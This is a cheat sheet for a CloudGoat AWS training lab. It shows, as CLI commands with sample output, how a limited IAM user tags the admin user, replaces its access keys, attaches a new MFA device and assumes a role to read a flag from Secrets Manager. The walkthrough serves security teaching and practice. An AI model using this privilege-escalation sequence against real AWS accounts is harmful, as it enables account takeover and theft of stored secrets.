# IAM Privecs by Key Rotation Cheat Sheet

`aws configure --profile manager`

Enumerate the credentials

```bash
aws iam list-user-policies --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager
# SelfManageAccess
# TagResources

aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name SelfManageAccess --profile manager

aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name TagResources --profile manager
```

With the permissions we can tag and change access keys for users with the tag `developer=true`.
- Looking at the IAM users there is a developer and an admin user.
- The admin user has permissions to assume a role `cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>` which allows it to retrieve the secret flag.

```bash
aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --tags '{"Key":"developer","Value":"true"}' --profile manager

aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager

aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --access-key-id <ACCESS_KEY_ID> --profile manager

aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager
# {
#     "AccessKey": {
#         "UserName": "admin_iam_privesc_by_key_rotation_<cloudgoat_id>",
#         "AccessKeyId": "AKIA....",
#         "Status": "Active",
#         "SecretAccessKey": "GQg+9Me8LmB+099t6....",
#         "CreateDate": "2023-09-04T19:20:02+00:00"
#     }
# }
```

With the "admin" users credentials we can assume the role it has access to...

```bash
aws configure --profile admin

aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --profile admin
# Access Denied
```

...the role can only be assumed when using multi-factor authentication

Lets create a new virtual mfa device, back in the manager user shell/profile.

```bash
aws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG --profile manager
# "SerialNumber": "arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa"
```

Scan the QR code in the file `QRCode.png`. For the following command put in two consecutive tokens. 

```bash
aws iam enable-mfa-device \
    --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> \
    --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa \
    --authentication-code1 <MFA Code #1> \
    --authentication-code2 <MFA Code #2> \
    --profile manager
```

Now we can assume the role since were using mfa. Switch back to the shell/profile that has the admin users credentials.

```bash
aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --profile admin --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code <TOKEN_CODE>
# {
#     "Credentials": {
#         "AccessKeyId": "ASIA...",
#         "SecretAccessKey": "Mm8ij9L8eV.....",
#         "SessionToken": "IQoJb3JpZ2luX2VjE..................",
#         "Expiration": "2023-09-04T20:36:44+00:00"
#     },
#     "AssumedRoleUser": {
#         "AssumedRoleId": "AROAZ6IIT5XU5WXMGTWEW:cloudgoat_secret",
#         "Arn": "arn:aws:sts::0123456789:assumed-role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>/cloudgoat_secret"
#     }
# }
```

Then Add the admin credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:

```
[admin]
aws_access_key_id = ASIA....
aws_secret_access_key = Mm8ij9L8eV....
aws_session_token = IQoJb3JpZ2luX2VjE..................
```

Then retrieve the secret and secret flag using admin.

```bash
aws secretsmanager list-secrets --profile admin

aws secretsmanager get-secret-value --secret-id cg_secret_iam_privesc_by_key_rotation_<cloudgoat_id> --profile admin | grep flag
# flag{...}
```
